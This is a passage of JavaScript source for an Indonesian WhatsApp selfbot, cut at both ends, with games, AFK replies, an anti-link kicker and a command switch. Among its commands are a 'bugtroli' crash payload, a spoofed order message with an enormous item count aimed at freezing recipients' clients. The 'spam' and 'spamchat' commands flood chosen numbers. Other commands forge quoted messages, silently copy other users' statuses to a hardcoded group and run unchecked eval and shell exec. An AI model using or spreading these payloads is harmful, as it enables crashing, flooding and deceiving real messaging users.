                    delete tebakgambar[sender.split("@")[0]]
                    fs.writeFileSync("./src/group/tebakgambar.json", JSON.stringify(tebakgambar))
                } else {
                    reply("Jawaban Anda Salah!")
                }
            }
            if (budy.includes("tebakgambar") && isKuis) {
            console.log('\x1b[1;31m~\x1b[1;37m>', '[\x1b[1;32mYANNZ\x1b[1;37m]', time2, color('tebakgambar'), 'from', color(sender.split('@')[0]), 'yanz :', color(yanz.length))
            if (tebakgambar.hasOwnProperty(sender.split('@')[0])) return reply("Selesein yg sebelumnya dulu atuh")
            get_result = await fetchJson(`https://lindow-api.herokuapp.com/api/kuis/tebakgambar?apikey=${apilin}`)
            get_result = get_result.result
            ini_image = get_result.images
            jawaban = get_result.jawaban
            ini_buffer = await getBuffer(ini_image)
            await riyan.sendMessage(from, ini_buffer, image, { quoted: yan, thumbnail: ini_buffer, caption: "Jawab gk? Jawab lahhh, masa enggak. 30 detik cukup kan? gk cukup pulang aja" }).then(() => {
            tebakgambar[sender.split("@")[0]] = jawaban.toLowerCase()
            fs.writeFileSync("./src/group/tebakgambar.json", JSON.stringify(tebakgambar))
            })
            console.log("Jawaban : " + jawaban)
            await sleep(30000)
            if (tebakgambar.hasOwnProperty(sender.split("@")[0])) {
            reply("Waktu Habis!!\nJawaban : " + jawaban + "\n\nNote : untuk memulai permainan lagi, mohon beri jeda 30 detik, setelah itu lanjut main lagi")
            delete tebakgambar[sender.split("@")[0]]
            fs.writeFileSync("./src/group/tebakgambar.json", JSON.stringify(tebakgambar))
            }}
            }

            if (!itsMe) {
            for (let x of mentionUser) {
            if (afk.hasOwnProperty(x.split('@')[0])) {
            ini_txt = `Maaf @${sender.split("@")[0]}, user yang anda reply atau tag sedang afk. `
            if (afk[x.split('@')[0]] != "") {
            ini_txt += "Dengan alasan " + afk[x.split('@')[0]]
            }
            thumbnail = fs.readFileSync('./strg/image/ranime2.jpeg')
            fakestatus(ini_txt, `Yanz Selfbot!`, text, thumbnail)
            }}
            if (afk.hasOwnProperty(sender.split('@')[0])) {
            thumbnail = fs.readFileSync('./strg/image/ranime2.jpeg')
            fakestatus("Anda telah keluar dari mode afk.", `${pushname2} Telah UnAfk !`, text, thumbnail)
            delete afk[sender.split('@')[0]]
            fs.writeFileSync("./src/group/afk.json", JSON.stringify(afk))
            }
            if (budy.includes("afk")) {
            if (yanz.length == 0) return reply(`Alasannya Apa Um?`)
            thumbnail = fs.readFileSync('./strg/image/ranime2.jpeg')
            alasan = yanz.join(" ")
            afk[sender.split('@')[0]] = alasan.toLowerCase()
            fs.writeFileSync("./src/group/afk.json", JSON.stringify(afk))
            ini_txt = "Anda telah afk. "
            if (alasan != "") {
            ini_txt += "Dengan alasan " + alasan
            }
            fakestatus(ini_txt, `${pushname2} Telah Afk !`, text, thumbnail)
            console.log('\x1b[1;31m~\x1b[1;37m>', '[\x1b[1;32mYANNZ\x1b[1;37m]', time2, color('afk'), 'from', color(sender.split('@')[0]), 'yanz :', color(yanz.length))
            console.log(clc.yellow(`Alasan ${pushname2} Afk Adalah :`), `${alasan}`)
            }}

            // Anti Link
            if (messagesC.includes("://chat.whatsapp.com/")) {
            if (isBot) return
            if (!isGroup) return
            if (!isAntiLink) return
            if (isOwner) return
            if (!isBotGroupAdmins) return reply('Untung cyaa bukan admin grup, kalo ngga udah cyaa kick kamu!')
            if (isGroupAdmins) return reply('Karena Kamu Adalah Admin Group, Bot Tidak Akan Kick Kamu')
            riyan.updatePresence(from, Presence.composing)
            if (messagesC.includes("#izinadmin")) return riyan.sendMessage(from, `Izin diterima @${sender.split("@")[0]} boleh mengirim link group`, text, {quoted: yan, contextInfo: {"mentionedJid": [sender]}})
            var kic = `${sender.split("@")[0]}@s.whatsapp.net`
            teks = `*「 LINK DETECTOR 」*\nLink Group Terdeteksi Maaf @${sender.split("@")[0]}\nAnda akan di kick dari group 5detik lagi`
            riyan.sendMessage(from, teks, text, {quoted: yan, contextInfo: {"mentionedJid": [sender]}})
            setTimeout( () => {
            riyan.groupRemove(from, [kic]).catch((e)=>{reply(`*ERR:* ${e}`)})
                }, 6000)
            setTimeout( () => {
            riyan.updatePresence(from, Presence.composing)
                reply("1detik")
                }, 5000)
            setTimeout( () => {
            riyan.updatePresence(from, Presence.composing)
                reply("2detik")
                }, 4000)
            setTimeout( () => {
            riyan.updatePresence(from, Presence.composing)
                reply("3detik")
                }, 3000)
            setTimeout( () => {
            riyan.updatePresence(from, Presence.composing)
                reply("4detik")
                }, 2000)
            setTimeout( () => {
            riyan.updatePresence(from, Presence.composing)
                reply("5detik")
                }, 1000)
            console.log('\x1b[1;31m~\x1b[1;37m>', '[\x1b[1;32mYANNZ\x1b[1;37m]', time2, '\x1b[1;31mANTILINK DETECTOR\x1b[1;37m', 'from', color(sender.split('@')[0]), 'yanz :', color(yanz.length))
                }

        if (!public) {
        mods.indexOf(botNumber) === -1 ? mods.push(botNumber) : false
        mods.indexOf(owner) === -1 ? mods.push(owner) : false
        if (!mods.includes(senderNumber)) return
        mods.slice(mods.indexOf(owner), 1)
        }

        if (isCmd) {
        tmp_hit.push(command)
        fs.writeFileSync('./src/tmp_hit.json', JSON.stringify(tmp_hit))
        tmphit.push(command)
        }

         if (/^>/.test(pes)) {
          let txt = pes.replace(/^>/, '')
          evaled = await eval(txt)
          if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
            riyan.sendMessage(from, evaled, text, {sendEphemeral: true,
                    contextInfo: {
                    forwardingScore: 999,
                        isForwarded: true,
                        participant: "0@s.whatsapp.net",
                        remoteJid: 'status@broadcast',                                                                                                                                                                                   quotedMessage: {
                            productMessage: {
                            product: {
                                currencyCode: "USD",
                                    title: '𝒀𝒂𝒏𝒏𝒛 𝑺𝒆𝒍𝒇𝒃𝒐𝒕 - 𝑩𝒚 𝒀𝒂𝒏𝒏𝒛',
                                    priceAmount1000: 100000000,
                                    productImageCount: 1,
                                    productImage: {
                                    jpegThumbnail: fs.readFileSync('./strg/image/ranime2.jpeg')
                                    }
                                },
                                businessOwnerJid: "0@s.whatsapp.net"
                            }
                        }
                    }
                })
            console.log('\x1b[1;31m~\x1b[1;37m>', '[\x1b[1;32mEVALED\x1b[1;37m]', `\x1b[1;33m${time2}\x1b[1;37m`, color('YanzSelfBot'), 'from', `\x1b[1;32mYanzGans\x1b[1;37m`)
            }

         if (!isGroup && isCmd) console.log('\x1b[1;31m~\x1b[1;37m>', '[\x1b[1;32mYANNZ\x1b[1;37m]', time2, color(command), 'from', color(sender.split('@')[0]), 'args :', color(yanz.length))
         if (isCmd && isGroup) console.log('\x1b[1;31m~\x1b[1;37m>', '[\x1b[1;32mYANNZ\x1b[1;37m]', time2, color(command), 'in', color(groupName), 'args :', color(yanz.length))

           switch (command) {
               case 'bugtroli':
                    thumb = "https://i.ibb.co/4ZFDCWZ/316c33b0bc2c.jpg"
                    xxx = await getBuffer(thumb)
                    url = "https://i.ibb.co/4ZFDCWZ/316c33b0bc2c.jpg"
                    thumbcr = await getBuffer(url)
                    riyan.sendMessage(from, xxx, image, {thumbnail: xxx, quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { 
                    orderMessage: {
                    itemCount: 1000000000000000000000000000000000000000000000000000000000000,
                    orderTitle: 'Riyan',
                    sellerJid: '0@s.whatsapp.net',
                    jpegThumbnail: thumbcr
                    }
                    }
                    }, contextInfo: { forwardingScore: 508, isForwarded: true}})
                    break
               case 'buggc':
                    var group = await riyan.groupMetadata(from)
                    var member = group['participants']
                    var mem = []
                    member.map( async adm => {
                    mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
                    })
                    teks = '𝒀𝒂𝒏𝒏𝒛 𝑺𝒆𝒍𝒇𝒃𝒐𝒕 - 𝑩𝒚 𝒀𝒂𝒏𝒏𝒛'
                    /*riyan.sendMessage(from, teks, text, {contextInfo: {
                    mentionedJid: mem}, quoted: freply
                    })*/
                    if (yanz[0] === 'true') {
                    riyan.toggleDisappearingMessages(from, 0)
                    } else if (yanz[0] === 'false') {
                    riyan.toggleDisappearingMessages(from, 604800)
                    }
                    break
               case 'bugtarget':
                    var group = await riyan.groupMetadata(from)
                    var member = group['participants']
                    var mem = []
                    member.map( async adm => {
                    mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
                    })
                    teks = '𝒀𝒂𝒏𝒏𝒛 𝑺𝒆𝒍𝒇𝒃𝒐𝒕 - 𝑩𝒚 𝒀𝒂𝒏𝒏𝒛'
                    riyan.sendMessage(from, teks, text, {contextInfo: {
                    mentionedJid: mem}, quoted: freply
                    })
                    if (yanz[0] === 'true') {
                    riyan.toggleDisappearingMessages(yanz[1], 0)
                    } else if (yanz[0] === 'false') {
                    riyan.toggleDisappearingMessages(yanz[1], 604800)
                    }
                    break
               case 'h':
               case 'help':
               case 'menu':
                    /*send = '6285791458996@s.whatsapp.net'
                    teks = (help(prefix, jam, tmp_hit, tmphit, ucapanWaktu, tanggal, riyan))
                    ciwi = fs.readFileSync('./strg/image/ranime2.jpeg')
                    bup = fs.readFileSync('./strg/image/riyan.jpg')
                    riyan.sendMessage(from, bup, image, {
                          caption: teks,
                          thumbnail: ciwi,
                          contextInfo: {
                          forwardingScore: 999,
                          isForwarded: true,
                          mentionedJid: [send],
                          participant: "0@s.whatsapp.net",
                          remoteJid: 'status@broadcast',
                          quotedMessage: {
                            productMessage: {
                                product: {
                                    title: '𝒀𝒂𝒏𝒏𝒛 𝑺𝒆𝒍𝒇𝒃𝒐𝒕 - 𝑩𝒚 𝒀𝒂𝒏𝒏𝒛',
                                    productImage: {
                                    jpegThumbnail: fs.readFileSync('./strg/image/ramadhan.jpeg')
                                    }
                                },
                                businessOwnerJid: "0@s.whatsapp.net"
                            }
                        }
                    }})*/
                    tagg = "6285791458996@s.whatsapp.net"
                    teks = (help(prefix, jam, tmp_hit, tmphit, ucapanWaktu, tanggal, riyan))
                    riyan.sendMessage(from, teks, text, {sendEphemeral: true, thumbnail: fs.readFileSync('./strg/image/riyan.jpg', 'base64'), quoted: fmen, contextInfo: {mentionedJid: [tagg]}})
                    break
               case 'ping':
                    yan = riyan.user
                    chats = riyan.chats.all()
                    const timestamp = speed();
                    const latensi = speed() - timestamp
                    const png = `Status bot : *Aktif*\nSpeed : ${latensi.toFixed(4)} _detik_\n\n*Bot Device Battery Info*\nBatterai : ${battre}%\nIs Charging : ${charging}\n\n*_Waktu Server Bot :_* ${jam} WIB\n*Hari ini* : ${tanggal}`
                    riyan.sendMessage(from, png, text, {
                    contextInfo: {
                        forwardingScore: 999,
                        isForwarded: true,
                        participant: "0@s.whatsapp.net",
                        remoteJid: 'status@broadcast',
                        quotedMessage: {
                            productMessage: {
                                product: {
                                    currencyCode: "IDR",
                                    title: '𝒀𝒂𝒏𝒏𝒛 𝑺𝒆𝒍𝒇𝒃𝒐𝒕 - 𝑩𝒚 𝒀𝒂𝒏𝒏𝒛',
                                    priceAmount1000: 10,
                                    productImageCount: 1,
                                    productImage: {
                                    jpegThumbnail: fs.readFileSync('./strg/image/riyan.jpg')
                                    }
                                },
                                businessOwnerJid: "0@s.whatsapp.net"
                            }
                        }
                    }})
                    break
               case 'fakethumb':
                    fk = body.slice(11)
                    depan = fk.split("|")[0]
                    belakang = fk.split("|")[1]
                    buff1 = await getBuffer(depan)
                    buff = await getBuffer(belakang)
                    riyan.sendMessage(from, buff, image, {quoted: yan, thumbnail: buff1})
                    break
               case 'fakethumb2':
                    fk = body.slice(12)
                    depan = fk.split("|")[0]
                    belakang = fk.split("|")[1]
                    asyu = fs.readFileSync(`./strg/image/${depan}`)
                    jncruk = fs.readFileSync(`./strg/image/${belakang}`)
                    riyan.sendMessage(from, jncruk, image, {quoted: yan, thumbnail: asyu})
                    break
               case 'shutdown':
               case 'stop':
                    riyan.sendMessage(from, 'Done!', text, {sendEphemeral: true, quoted: freply})
                    await sleep(1000)
                    return riyan.sendMessage(from, JSON.stringify(eval(process.exit())), text, {quoted: freply})
                    break
               case 'return':
                    riyan.sendMessage(from, JSON.stringify(eval(yanz.join(' '))), text, {
                    contextInfo: {
                          forwardingScore: 999,
                          isForwarded: true,
                          participant: "0@s.whatsapp.net",
                          remoteJid: 'status@broadcast',
                          quotedMessage: {
                            productMessage: {
                            product: {
                                    currencyCode: "USD",
                                    title: '𝒀𝒂𝒏𝒏𝒛 𝑺𝒆𝒍𝒇𝒃𝒐𝒕 - 𝑩𝒚 𝒀𝒂𝒏𝒏𝒛',
                                    priceAmount1000: 1000000,
                                    productImageCount: 1,
                                    productImage: {
                                    jpegThumbnail: fs.readFileSync('./strg/image/ranime2.jpeg')
                                    }
                                },
                                businessOwnerJid: "0@s.whatsapp.net"
                            }
                        }
                    }})
                    break
               case 'eval':
                    var evaled = await eval(q)
                    if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
                    await reply(evaled)
                    break
               case 'view':
               case 'fetch':
               case 'result':
                    teks = yanz.join(' ')
                    const util = require('util')
                    let res = await fetch(teks)
                    if (!/text|json/.test(res.headers.get('content-type'))) return riyan.sendMessage(from, res, image, { caption: text, quoted: yan })
                    let txt = await res.buffer()
                    try {
                    txt = util.format(JSON.parse(txt+''))
                    } catch (e) {
                    txt = txt + ''
                    } finally {
                    riyan.sendMessage(from, txt.slice(0, 65536) + '', MessageType.extendedText, { quoted: yan })
                    }
                    break
               case 'term':
                    const cmde = body.slice(6)
                    var itsme = `0@s.whatsapp.net`
                    var split = `*EXECUTOR*`
                        const term = {
                           contextInfo: {
                              participant: itsme,
                              quotedMessage: {
                      extendedTextMessage: {
                      text: split,
                                     }
                                }
                           }
                      }
                    exec(cmde, (err, stdout) => {
                    if (err) return riyan.sendMessage(from, `root@Nfz.01:~ ${err}`, text, { quoted: yan })
                    if (stdout) {
                    riyan.sendMessage(from, stdout, text, term)
                     }
                    })
                    break
               case 'spam':
                    arge = yanz.join(" ")
                    if (!arg) return reply(from, `Penggunaan ${prefix}spam jumlah|teks`)
                    argz = arge.split("|")
                    if (!argz) return reply(`Penggunaan ${prefix}spam jumlah|teks`)
                    if (isNaN(argz[0])) return reply(`harus berupa angka`)
                    for (let i = 0; i < argz[0]; i++){
                    riyan.sendMessage(from, argz[1], text)
                    }
                    break
               case 'spamchat':
                    arge = yanz.join(" ")
                    if (!arg) return reply(from, `Penggunaan ${prefix}spam @tag/62xx|jumlah|teks`)
                    ynz = arge.split("|")
                    if (!ynz) return reply(`Penggunaan ${prefix}spam @tag/62xx|jumlah|teks`)
                    if (isNaN(ynz[1])) return reply(`harus berupa angka`)
                    if (yan.message.extendedTextMessage != undefined) {
                    for (let i = 0; i < ynz[1]; i++) {
                    riyan.sendMessage(`${mentionUser}`, ynz[2], text)
                    }
                    send = `${mentionUser}`
                    fakestatus2(`Berhasil spam ${ynz[1]} pesan ke nomor @${mentionUser[0].split("@")[0]}`, cr, text, fakethumb, send)
                    } else {
                    for (let i = 0; i < ynz[1]; i++) {
                    riyan.sendMessage(ynz[0] + "@s.whatsapp.net", ynz[2], text)
                    }
                    fakestatus(`Berhasil spam ${ynz[1]} pesan ke nomor ${ynz[0]}`, cr, text, fakethumb)
                    }
                    break
               case 'tagme':
                    me = riyan.user
                    const xixi = {
                    text: `@${me.jid.split('@')[0]}`,
                    contextInfo: { mentionedJid: [me.jid] }
                    }
                    riyan.sendMessage(from, xixi, text, { quoted: yan })
                    break
               case 'typing':
                    riyan.updatePresence(from, Presence.composing)
                    if (yanz[1] == "stop") {
                    riyan.updatePresence(from, Presence.paused)
                    }
                    break
               case 'response':
                    if (yanz[0] === 'on') {
                    respon_pm = true
                    fakestatus(`Status : On`, 'Response In Private Chat', text, fakethumb)
                    } if (yanz[0] === 'off') {
                    respon_pm = false
                    fakestatus(`Status : Off`, 'Response In Private Chat', text, fakethumb)
                    }
                    break
               case 'simi':
                    if (yanz[0] === 'on') {
                    simi = true
                    thumbnail = fs.readFileSync('./strg/image/ranime2.jpeg')
                    fakestatus(`Status : On`, 'Chat With Simi', text, thumbnail)
                    } if (yanz[0] === 'off') {
                    simi = false
                    thumbnail = fs.readFileSync('./strg/image/ranime2.jpeg')
                    fakestatus(`Status : off`, 'Chat With Simi', text, thumbnail)
                    }
                    break
               case 'delchat':
                    thumbnail = fs.readFileSync('./strg/image/ranime2.jpeg')
                    fakestatus(`*succes delete this chat*`, '𝒀𝒂𝒏𝒛 𝑺𝒆𝒍𝒇𝒃𝒐𝒕', text, thumbnail)
                    console.log('succes delete chat = ' + from)
                    await sleep(4000)
                    riyan.modifyChat(from, ChatModification.delete)
                    break
               case 'pinchat':
                    thumbnail = fs.readFileSync('./strg/image/ranime2.jpeg')
                    fakestatus(`*succes pin this chat*`, '𝒀𝒂𝒏𝒛 𝑺𝒆𝒍𝒇𝒃𝒐𝒕', text, thumbnail)
                    console.log('succes pin chat = ' + from)
                    riyan.modifyChat(from, ChatModification.pin)
                    break
               case 'unpinchat':
                    thumbnail = fs.readFileSync('./strg/image/ranime2.jpeg')
                    fakestatus(`*succes unpin this chat*`, '𝒀𝒂𝒏𝒛 𝑺𝒆𝒍𝒇𝒃𝒐𝒕', text, thumbnail)
                    console.log('succes unpin chat = ' + from)
                    riyan.modifyChat(from, ChatModification.unpin)
                    break
               case 'archivechat':
                    thumbnail = fs.readFileSync('./strg/image/ranime2.jpeg')
                    fakestatus(`*succes archive this chat*`, '𝒀𝒂𝒏𝒛 𝑺𝒆𝒍𝒇𝒃𝒐𝒕', text, thumbnail)
                    console.log('succes archive chat = ' + from)
                    await sleep(3000)
                    riyan.modifyChat(from, ChatModification.archive)
                    break
               case 'unarchivechat':
                    thumbnail = fs.readFileSync('./strg/image/ranime2.jpeg')
                    fakestatus(`*succes unarchive this chat*`, '𝒀𝒂𝒏𝒛 𝑺𝒆𝒍𝒇𝒃𝒐𝒕', text, thumbnail)
                    console.log('succes unarchive chat = ' + from)
                    riyan.modifyChat(from, ChatModification.unarchive)
                    break
               case 'mutechat':
                    thumbnail = fs.readFileSync('./strg/image/ranime2.jpeg')
                    fakestatus(`*succes mute this chat*`, '𝒀𝒂𝒏𝒛 𝑺𝒆𝒍𝒇𝒃𝒐𝒕', text, thumbnail)
                    console.log('succes mute chat = ' + from)
                    riyan.modifyChat(from, ChatModification.mute, 1000 * 60 * 60 * 24)
                    break
               case 'unmutechat':
                    thumbnail = fs.readFileSync('./strg/image/ranime2.jpeg')
                    fakestatus(`*succes unmute this chat*`, '𝒀𝒂𝒏𝒛 𝑺𝒆𝒍𝒇𝒃𝒐𝒕', text, thumbnail)
                    console.log('succes unmute chat = ' + from)
                    riyan.modifyChat(from, ChatModification.unmute)
                    break
               case 'join':
                    if (isGroup) return await reply('This command only for private chat')
                    if (yanz.length == 0) return await reply('link group?')
                    var link = yanz[0].replace("https://chat.whatsapp.com/", "")
                    await riyan.acceptInvite(link)
                    thumbnail = fs.readFileSync('./strg/image/ranime2.jpeg')
                    fakestatus(`*succes joined this group link*`, '𝒀𝒂𝒏𝒛 𝑺𝒆𝒍𝒇𝒃𝒐𝒕', text, thumbnail)
                    break
               case 'revoke':
                    riyan.revokeInvite(from)
                    thumbnail = fs.readFileSync('./strg/image/ranime2.jpeg')
                    fakestatus(`*succes revoke this group link*`, '𝒀𝒂𝒏𝒛 𝑺𝒆𝒍𝒇𝒃𝒐𝒕', text, thumbnail)
                    break
               case 'unread?':
                    const unread = await riyan.loadAllUnreadMessages()
                    riyan.sendMessage(from, `unread message count : *${unread.length}*`, MessageType.text)
                    break
               case 'listonline':
                    let ido = yanz && /\d+\-\d+@g.us/.test(yanz[0]) ? yanz[0] : from
                    let online = [...Object.keys(riyan.chats.get(ido).presences), riyan.user.jid]
                    riyan.sendMessage(from, '*List Online :*\n' + online.map(v => '- @' + v.replace(/@.+/, '')).join`\n`, text, { quoted: yan,
                    contextInfo: { mentionedJid: online }
                    })
                    break
               case 'afk':
               case 'jadian':
               case 'grouplink':
               case 'suit':
               case 'tebakgambar':
                    break
               case 'upstory':
                    teks = body.slice(9)
                    riyan.sendMessage('status@broadcast', teks, MessageType.text)
                    riyan.sendMessage(from, '*Succes Uploading!!*', text, {
                    quoted: {
                    key: {
                    fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? {
                    remoteJid: "status@broadcast"
                    }: {})
                    }, message: {"videoMessage": {"caption": "𝐘𝐀𝐍𝐍𝐙 𝐒𝐄𝐋𝐅𝐁𝐎𝐓", "jpegThumbnail": fs.readFileSync('./strg/image/riyan.jpg')}}}})
                    break
               case 'upstorypic':
                    stast = body.slice(12)
                    if (isMedia && !yan.message.videoMessage || isQuotedImage) {
                    const swsw = isQuotedImage ? JSON.parse(JSON.stringify(yan).replace('quotedM','m')).message.extendedTextMessage.contextInfo : yan
                    cihcih = await riyan.downloadMediaMessage(swsw)
                    riyan.sendMessage('status@broadcast', cihcih, image, {caption: `${stast}`})
                    }
                    riyan.sendMessage(from, '*Succes Uploading!!*', text, {
                    quoted: {
                    key: {
                    fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? {
                    remoteJid: "status@broadcast"
                    }: {})
                    }, message: {"imageMessage": {"caption": "𝐘𝐀𝐍𝐍𝐙 𝐒𝐄𝐋𝐅𝐁𝐎𝐓", "jpegThumbnail": fs.readFileSync('./strg/image/riyan.jpg')}}}})
                    break
               case 'upstoryvid':
                    stast = body.slice(12)
                    if (isMedia && !yan.message.videoMessage || isQuotedVideo) {
                    const swsw2 = isQuotedVideo ? JSON.parse(JSON.stringify(yan).replace('quotedM','m')).message.extendedTextMessage.contextInfo : yan
                    cihcih2 = await riyan.downloadMediaMessage(swsw2)
                    riyan.sendMessage('status@broadcast', cihcih2, video, {caption: `${stast}`})
                    }
                    riyan.sendMessage(from, '*Succes Uploading!!*', text, {
                    quoted: {
                    key: {
                    fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? {
                    remoteJid: "status@broadcast"
                    }: {})
                    }, message: {"videoMessage": {"caption": "𝐘𝐀𝐍𝐍𝐙 𝐒𝐄𝐋𝐅𝐁𝐎𝐓", "jpegThumbnail": fs.readFileSync('./strg/image/riyan.jpg')}}}})
                    break
               case 'savesw':
                    if (isMedia && !yan.message.extendedTextMessage.contextInfo.quotedMessage.imageMessage.caption || isQuotedImage) {
                    encmedia = JSON.parse(JSON.stringify(yan).replace('quotedM','m')).message.extendedTextMessage.contextInfo
                    media = await riyan.downloadAndSaveMediaMessage(encmedia)
                    buff = fs.readFileSync(media)
                    teks = yan.message.extendedTextMessage.contextInfo.quotedMessage.imageMessage.caption
                    riyan.sendMessage("6281703664152-1613726299@g.us", buff, image, {quoted: yan, caption: teks})
                    fakestatus(`*succes save story image*\n\nThanks Ngab:v`, '𝒀𝒂𝒏𝒛 𝑺𝒆𝒍𝒇𝒃𝒐𝒕', text, fakethumb)
                    fs.unlinkSync(media)
                    } else if (isMedia && !yan.message.extendedTextMessage.contextInfo.quotedMessage.videoMessage.caption || isQuotedVideo) {
                    encmedia = JSON.parse(JSON.stringify(yan).replace('quotedM','m')).message.extendedTextMessage.contextInfo
                    media = await riyan.downloadAndSaveMediaMessage(encmedia)
                    buff = fs.readFileSync(media)
                    teks = yan.message.extendedTextMessage.contextInfo.quotedMessage.videoMessage.caption
                    riyan.sendMessage("6281703664152-1613726299@g.us", buff, video, {quoted: yan, caption: teks})
                    fakestatus(`*succes save story image*\n\nThanks Ngab:v`, '𝒀𝒂𝒏𝒛 𝑺𝒆𝒍𝒇𝒃𝒐𝒕', text, fakethumb)
                    fs.unlinkSync(media)
                    } else if (isMedia && !yan.message.videoMessage || isQuotedImage) {
                    ger = isQuotedImage ? JSON.parse(JSON.stringify(yan).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : yan
                    owgi = await riyan.downloadAndSaveMediaMessage(ger)
                    ran = fs.readFileSync(owgi)
                    send = `${sender.split("@")[0]}@s.whatsapp.net`
                    riyan.sendMessage("6281703664152-1613726299@g.us", ran, image, {quoted: yan})
                    fakestatus(`*succes save story image*\n\nThanks Ngab:v`, '𝒀𝒂𝒏𝒛 𝑺𝒆𝒍𝒇𝒃𝒐𝒕', text, fakethumb)
                    fs.unlinkSync(owgi)
                    } else if (isMedia && !yan.message.videoMessage || isQuotedVideo) {
                    ger = isQuotedVideo ? JSON.parse(JSON.stringify(yan).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : yan
                    owgi = await riyan.downloadAndSaveMediaMessage(ger)
                    ran = fs.readFileSync(owgi)
                    send = `${sender.split("@")[0]}@s.whatsapp.net`
                    riyan.sendMessage("6281703664152-1613726299@g.us", ran, video, {quoted: yan})
                    fakestatus(`*succes save story video*\n\nThanks Ngab`, '𝒀𝒂𝒏𝒛 𝑺𝒆𝒍𝒇𝒃𝒐𝒕', text, fakethumb)
                    fs.unlinkSync(owgi)
                    } else {
                    teks = yan.message.extendedTextMessage.contextInfo.quotedMessage.extendedTextMessage.text
                    riyan.sendMessage("6281703664152-1613726299@g.us", teks, text, {quoted: yan})
                    fakestatus(`*succes copy story teks*\n\nThanks Ngab:v`, '𝒀𝒂𝒏𝒛 𝑺𝒆𝒍𝒇𝒃𝒐𝒕', text, fakethumb)
                    }
                    break
               case 'mystat':
               case 'mystatus':
                    send = '6285791458996@s.whatsapp.net'
                    send2 = meNumber
                    let timestampi = speed();
                    let latensii = speed() - timestampi
                    const { wa_version, mcc, mnc, os_version, device_manufacturer, device_model } = riyan.user.phone
                    anu = process.uptime()
                teksny = ` Device Info :
 - *Number :* @${meNumber.split("@")[0]}
 - *Platform :* ${os.platform()}
  ├ *V. WhatsApp :* ${wa_version}
  ├ *RAM :* ${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2)}MB / ${Math.round(require('os').totalmem / 1024 / 1024)}MB
  ├ *MCC :* ${mcc}
  ├ *MNC :* ${mnc}
  ├ *Hostname :* ${os.hostname()}
  ├ *Versi OS :* ${os_version}
  ├ *Merk HP :* ${device_manufacturer}
  └ *Versi HP :* ${device_model}

 Bot Info :
 - *Owner :* @${send.split("@")[0]}
 - *${tmp_hit.length}* Loaded Messages
 • *${unread2.length}* Unread Messages
  ├ *Batterai :* ${battre}%
  ├ *Is Charging :* ${charging}
  ├ *Group Chat :* ${totalgroup.length}
  ├ *Personal Chat :* ${totalchat.length - totalgroup.length}
  ├ *Total Chat :* ${totalchat.length}
  ├ *Total Block :* ${blocked.length}
  ├ *Speed :* ${latensii.toFixed(4)} Second
  └ *Runtime :* ${kyun(anu)}`
                    ini_fakestatus = {sendEphemeral: true,
                      contextInfo: {mentionedJid: [send, send2]},
                      quoted: {
                      key: {
                        fromMe: false,
                        participant: `0@s.whatsapp.net`, ...(from ? {
                        remoteJid: "status@broadcast"
                        }: {})
                        }, message: {
                           imageMessage: {
                           caption: `𝒀𝒂𝒏𝒏𝒛 𝑺𝒆𝒍𝒇𝒃𝒐𝒕 - 𝑩𝒚 𝒀𝒂𝒏𝒏𝒛`,
                           jpegThumbnail: fs.readFileSync(`./strg/stiker/dah jago.webp`)
                          }
                        }
                      }
                    }
                    riyan.sendMessage(from, teksny, text, ini_fakestatus)
                    break
               case 'setdesc':
                    riyan.groupUpdateDescription(from, `${q}`)
                    thumbnail = fs.readFileSync('./strg/image/ranime2.jpeg')
                    fakestatus(`*Succes Ganti Deskripsi Group*`, '𝒀𝒂𝒏𝒛 𝑺𝒆𝒍𝒇𝒃𝒐𝒕', text, thumbnail)
                    break
               case 'setnamegc':
                    riyan.groupUpdateSubject(from, `${q}`)
                    thumbnail = fs.readFileSync('./strg/image/ranime2.jpeg')
                    fakestatus(`*Succes Ganti Nama Group*`, '𝒀𝒂𝒏𝒛 𝑺𝒆𝒍𝒇𝒃𝒐𝒕', text, thumbnail)
                    break
               case 'linkgc':
               case 'linkgroup':
                    linkgc = await riyan.groupInviteCode (from)
                    yeh = `https://chat.whatsapp.com/${linkgc}\n\nlink Group *${groupName}*`
                    reply(yeh)
                    break
               case 'setppgc':
               case 'setprofilegc':
                    riyan.updatePresence(from, Presence.composing)
                    if (!isQuotedImage) return reply(`Kirim gambar dengan caption ${prefix}setbotpp atau tag gambar yang sudah dikirim`)
                    enmedia = JSON.parse(JSON.stringify(yan).replace('quotedM','m')).message.extendedTextMessage.contextInfo
                    media = await riyan.downloadAndSaveMediaMessage(enmedia)
                    await riyan.updateProfilePicture(from, media)
                    thumbnail = fs.readFileSync('./strg/image/ranime2.jpeg')
                    fakestatus(`*Succes Ganti Icon Group*`, '𝒀𝒂𝒏𝒛 𝑺𝒆𝒍𝒇𝒃𝒐𝒕', text, thumbnail)
                    fs.unlinkSync(media)
                    break
               case 'cgc':
                    if (yanz.length < 1) return reply(`*Usage :*\n${prefix}cgc namagc|nomer|nomer\n\n*Ex :*\n${prefix}cgc Grup Bot|62xxxxxxxxxxx|62xxxxxxxxxxx\n\nNote : Max nomer yang dapat di tambahkan hanya 3 nomor, selebihnya add sendiri`)
                    nn = body.slice(5)
                    var namgc = nn.split("|")[0];
                    var hemmv = nn.split("|")[1];
                    var yakan = nn.split("|")[2];
                    var yanganz = nn.split("|")[3];
                    riyan.groupCreate(`${namgc}`, [`${hemmv}@s.whatsapp.net`,`${yakan}@s.whatsapp.net`,`${yanganz}@s.whatsapp.net`])
                    thumbnail = fs.readFileSync('./strg/image/ranime2.jpeg')
                    fakestatus(`*Succes Create Group ${namgc}*`, '𝒀𝒂𝒏𝒛 𝑺𝒆𝒍𝒇𝒃𝒐𝒕', text, thumbnail)
                    break
               case 'create':
                    cgg = '_*CREATE - GROUP*_'
                    nn = body.slice(8)
                    var namegc = nn.split("|")[0];
                    var one = nn.split("|")[1];
                    riyan.groupCreate(`${namegc}`, [`${one}@s.whatsapp.net`])
                    thumbnail = fs.readFileSync('./strg/image/ranime2.jpeg')
